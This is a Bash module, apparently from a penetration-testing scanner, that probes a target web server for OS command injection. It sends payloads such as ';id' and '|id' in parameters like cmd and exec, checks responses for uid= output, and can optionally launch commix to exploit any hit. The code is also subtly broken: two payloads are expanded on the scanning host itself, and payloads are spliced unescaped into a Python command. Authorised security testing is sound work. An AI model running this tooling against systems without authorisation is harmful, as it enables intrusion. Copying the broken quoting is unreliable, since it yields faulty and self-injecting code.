MODE_NAME="command-inject"
MODE_DESCRIPTION="Test for OS command injection vulnerabilities"
MODE_REQUIRED_VARS=(TARGET LOOT_DIR)
MODE_REQUIRED_TOOLS=(curl)

CMD_EXEC_TIMEOUT="${CMD_EXEC_TIMEOUT:-30}"

mode_validate() {
  [[ -n "$TARGET" ]] || { log_fail "TARGET not set"; return 1; }
  [[ -n "$LOOT_DIR" ]] || { log_fail "LOOT_DIR not set"; return 1; }
}

mode_init() {
  mkdir -p "$LOOT_DIR/vulnerabilities/command-exec"
}

mode_run() {
  local outdir="$LOOT_DIR/vulnerabilities/command-exec"
  local target="${TARGET}"
  local port="${PORT:-80}"

  section_banner
  section_header "COMMAND INJECTION SCAN: $target"

  local payloads=(";id" "|id" "&& id" "`id`" "$(id)")
  local param_names=("cmd" "command" "exec" "execute" "run" "ping" "trace" "traceroute")

  for param in "${param_names[@]}"; do
    for payload in "${payloads[@]}"; do
      local encoded
      encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
      local result
      result=$(curl -s -m "$CMD_EXEC_TIMEOUT" "http://$target:$port/?$param=$encoded" 2>/dev/null || true)
      if echo "$result" | grep -qi "uid=\|gid=\|root:" 2>/dev/null; then
        log_warn "Possible command injection via parameter '$param' on $target"
        sniper_findings_add "$target" "command-injection" "CRITICAL" "command-inject" "Parameter '$param' with payload '$payload' returned: $(echo "$result" | head -c 200)"
        echo "$result" > "$outdir/${target}-${param}-cmd-inject.txt"
      fi
    done
  done

  if [[ "$CMD_EXEC_EXPLOIT" == "1" && -x "$(command -v commix)" ]]; then
    section_header "RUNNING COMMIX AGAINST $target"
    commix --url="http://$target:$port/" --batch --output-dir="$outdir/commix-$target" 2>/dev/null
  fi
}

mode_cleanup() {
  log_info "Command injection scan complete for $TARGET"
}

mode_execute
